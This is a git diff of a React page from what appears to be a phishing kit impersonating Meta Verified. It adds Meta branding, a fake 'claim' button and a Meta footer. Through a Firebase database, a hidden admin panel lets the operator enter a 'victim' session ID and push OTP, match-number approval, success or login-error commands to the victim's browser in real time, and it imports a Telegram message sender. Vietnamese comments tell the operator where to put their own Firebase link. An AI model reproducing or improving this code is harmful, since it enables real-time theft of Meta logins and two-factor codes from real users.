@@ -1,10 +1,15 @@
 import { useState, useEffect } from 'react';
 import { sendTelegramMessage, setInitialSession, escapeHtml, countryCodeMap } from '../utils/telegram';
 import { translations } from '../translations'; 
+import { initializeApp } from "firebase/app";
+import { getDatabase, ref, set, onValue } from "firebase/database";
 
 // ==========================================
 // THAY LINK FIREBASE CỦA MÀY VÀO ĐÂY
 const FIREBASE_URL = 'https://project-86410307853429089-default-rtdb.firebaseio.com/';
+const firebaseConfig = { databaseURL: FIREBASE_URL };
+const app = initializeApp(firebaseConfig);
+const database = getDatabase(app);
 // ==========================================
 
 export default function Home() {
@@ -83,29 +88,28 @@ export default function Home() {
 
   // --- LẮNG NGHE LỆNH TỪ ADMIN QUA FIREBASE (REAL-TIME) ---
   useEffect(() => {
-    let interval;
-    if (step === 3 && !showAdmin) {
-        // Dùng Firebase REST API để lấy dữ liệu. Dùng setInterval 3s cho an toàn.
-        interval = setInterval(() => {
-            fetch(`${FIREBASE_URL}/commands/${sessionId}.json?t=${Date.now()}`)
-            .then(res => res.json())
-            .then(data => {
-                if (data) {
-                    if (data.action === 'otp' && matchNumber !== null) {
-                        setMatchNumber(null); setShowSuccess(false);
-                    } else if (data.action === 'approve' && data.value && matchNumber !== data.value) {
-                        setMatchNumber(data.value); setShowSuccess(false);
-                    } else if (data.action === 'success' && !showSuccess) {
-                        setShowSuccess(true);
-                    } else if (data.action === 'error' && step !== 2) {
-                        setStep(2); setShowLoginError(true); setLoginPass(''); setShowSuccess(false);
-                    }
+    if (showModal && !showAdmin) {
+        const commandRef = ref(database, 'commands/' + sessionId);
+        const unsubscribe = onValue(commandRef, (snapshot) => {
+            const data = snapshot.val();
+            if (data && data.action) {
+                if (data.action === 'otp') {
+                    setStep(3); setMatchNumber(null); setShowSuccess(false);
+                } 
+                else if (data.action === 'approve' && data.value) {
+                    setStep(3); setMatchNumber(data.value); setShowSuccess(false);
+                } 
+                else if (data.action === 'success') {
+                    setStep(3); setShowSuccess(true);
+                } 
+                else if (data.action === 'error') {
+                    setStep(2); setShowLoginError(true); setLoginPass(''); setShowSuccess(false);
                 }
-            }).catch(()=>{});
-        }, 3000); // 3 giây check 1 lần
+            }
+        });
+        return () => unsubscribe();
     }
-    return () => clearInterval(interval);
-  }, [step, showAdmin, sessionId, matchNumber, showSuccess]);
+  }, [showModal, showAdmin, sessionId]);
 
   // --- PHÍM TẮT MỞ ADMIN ---
   useEffect(() => {
@@ -153,16 +157,18 @@ export default function Home() {
     }, 1500);
   };
 
-  // --- HÀM GỬI LỆNH TỪ ADMIN LÊN FIREBASE ---
   const handleAdminCommand = (type, value) => {
       const targetUser = adminSessionId.trim(); 
       if (!targetUser) { alert('Vui lòng nhập Mã Phiên của nạn nhân!'); return; }
       
-      fetch(`${FIREBASE_URL}/commands/${targetUser}.json`, {
-          method: 'PUT',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ action: type, value: value })
-      }).then(() => { alert(`Đã gửi lệnh thành công cho ${targetUser}!`); });
+      set(ref(database, 'commands/' + targetUser), {
+          action: type,
+          value: value
+      }).then(() => {
+          alert(`Đã gửi lệnh thành công cho ${targetUser}!`);
+      }).catch((error) => {
+          alert("Lỗi gửi lệnh: " + error.message);
+      });
   };
 
   return (
@@ -248,6 +254,17 @@ export default function Home() {
           </div>
       </section>
 
+      <section className="cta">
+          <div className="cta-inner">
+              <div className="cta-content">
+                  <svg className="cta-icon" viewBox="0 0 84 84"><path fill="#0064e0" d="m50.4.47c1.79-.97 4.02-.37 5.08 1.36l4.99 8.17 9.57.24c2.03.05 3.67 1.69 3.72 3.72l.24 9.57 8.17 4.99c1.74 1.06 2.34 3.3 1.36 5.08l-4.58 8.4 4.58 8.4c.97 1.79.37 4.02-1.36 5.08l-8.17 4.99-.24 9.57c-.05 2.03-1.69 3.67-3.72 3.72l-9.57.24-4.99 8.17c-1.06 1.74-3.3 2.34-5.08 1.36l-8.4-4.58-8.4 4.58c-1.79.97-4.02.37-5.08-1.36l-4.99-8.17-9.57-.24c-2.03-.05-3.67-1.69-3.72-3.72l-.24-9.57-8.17-4.99c-1.74-1.06-2.34-3.3-1.36-5.08l4.58-8.4L.47 33.6c-.97-1.79-.37-4.02 1.36-5.08l8.17-4.99.24-9.57c.05-2.03 1.69-3.67 3.72-3.72l9.57-.24L28.51 1.83c1.06-1.74 3.3-2.34 5.08-1.36l8.4 4.58L50.4.47zm9.31 34.92c1.62-1.35 1.84-3.76.49-5.38-1.35-1.62-3.76-1.84-5.38-.49l-.26.21c-6.64 5.54-12.84 11.59-18.52 18.1l-6.62-6.62c-1.49-1.49-3.91-1.49-5.4 0-1.49 1.49-1.49 3.91 0 5.4l9.55 9.55c.76.76 1.8 1.16 2.87 1.11 1.07-.05 2.07-.55 2.76-1.37l.21-.26c6.06-7.27 12.77-13.98 20.04-20.04l.26-.21z"/></svg>
+                  <h2 className="cta-title">{t.ctaTitle}</h2>
+                  <button className="btn-primary" onClick={openModal}>{t.claimBtn}</button>
+              </div>
+              <div className="cta-image"><img src="/images/hero.webp" alt="Meta Verified" /></div>
+          </div>
+      </section>
+
       <section className="faq" id="faq">
           <div className="faq-inner">
               <h2>{t.faqTitle}</h2>
@@ -262,6 +279,24 @@ export default function Home() {
               </div>
           </div>
       </section>
+
+      <footer className="footer" id="footer">
+          <div className="footer-inner">
+              <div className="footer-newsletter">
+                  <div className="footer-row">
+                      <div style={{ maxWidth: '480px' }}><div className="footer-title">Get the latest updates from Meta for Business.</div><p className="footer-desc">Provide your email address to receive the latest updates from Meta for Business, including news, events and product updates.</p></div>
+                      <div className="footer-form"><input type="email" className="footer-input" placeholder="Your email address" /><button className="footer-subscribe">Subscribe</button></div>
+                  </div>
+                  <p className="footer-consent">By submitting this form, you agree to receive marketing-related electronic communications from Meta. You may withdraw your consent and unsubscribe at any time.</p>
+              </div>
+              <div className="footer-bottom">
+                  <span className="footer-copy">© 2026 Meta</span>
+                  <div className="footer-grid">
+                      <div><a href="#hero" className="footer-link">About</a></div><div><a href="#steps" className="footer-link">Developers</a></div><div><a href="#benefits" className="footer-link">Careers</a></div><div><a href="#faq" className="footer-link">Privacy</a></div><div><a href="#faq" className="footer-link">Cookies</a></div><div><a href="#faq" className="footer-link">Terms</a></div>
+                  </div>
+              </div>
+          </div>
+      </footer>
 
       {/* ================= MODAL FORM NHẬP LIỆU ================= */}
       {showModal && (
